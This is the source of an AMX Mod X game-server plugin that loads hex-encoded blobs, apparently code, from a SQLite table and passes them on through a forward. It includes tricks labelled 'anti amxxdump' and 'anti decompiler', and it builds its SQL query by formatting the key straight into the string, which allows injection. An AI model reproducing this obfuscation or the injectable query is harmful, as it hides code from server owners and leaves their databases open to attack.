#include <amxmodx>
#include <sqlx>

// #pragma compress 1 // anti amxxdump

#include "utils.inl"

new Handle:g_sql_tuple;
new db_forward;

public plugin_init(){
	register_plugin("DB", "13.37", "RiviT");
	db_forward = CreateMultiForward("db_results_ready", ET_CONTINUE, FP_ARRAY, FP_ARRAY, FP_CELL, FP_CELL);
	register_cvar("amx_sql_host", "127.0.0.1", FCVAR_PROTECTED)
	register_cvar("amx_sql_user", "root", FCVAR_PROTECTED)
	register_cvar("amx_sql_pass", "", FCVAR_PROTECTED)
	register_cvar("amx_sql_db", "amx", FCVAR_PROTECTED)
	register_cvar("amx_sql_type", "mysql", FCVAR_PROTECTED)
	register_cvar("amx_sql_timeout", "60", FCVAR_PROTECTED)
	set_task(0.5, "init_sql");
}

public init_sql(){
	SQL_SetAffinity("sqlite");
	g_sql_tuple = SQL_MakeStdTuple();
}

public plugin_end(){
	SQL_FreeHandle(g_sql_tuple);
}

public plugin_natives(){
	register_native("db_get", "get", 1);
}

public get(key[]){
	param_convert(1);
	SQL_ThreadQuery(g_sql_tuple, "get_handle", fmt("SELECT * FROM `hex_data` WHERE `name`='%s';", key));
}

new data[MAX_DATA_LEN];
public get_handle(failstate, Handle:query, error[]){
	if(failstate != TQUERY_SUCCESS){
		log_amx("get_handle: failstate: %d error: %s", failstate, error);
	}

	if(SQL_NumResults(query)){
		new name[64], func_base;

		SQL_ReadResult(query, SQL_FieldNameToNum(query, "data"), data, sizeof(data));
		SQL_ReadResult(query, SQL_FieldNameToNum(query, "name"), name, sizeof(name));
		func_base = SQL_ReadResult(query, SQL_FieldNameToNum(query, "func_base"));
		
		new new_len = unhex(data, strlen(data));
		ExecuteForward(db_forward, _, PrepareArray(name, sizeof(name)), PrepareArray(data, MAX_DATA_LEN), new_len, func_base);
	}
}
#emit sysreq.c 0x1337 // anti decompiler
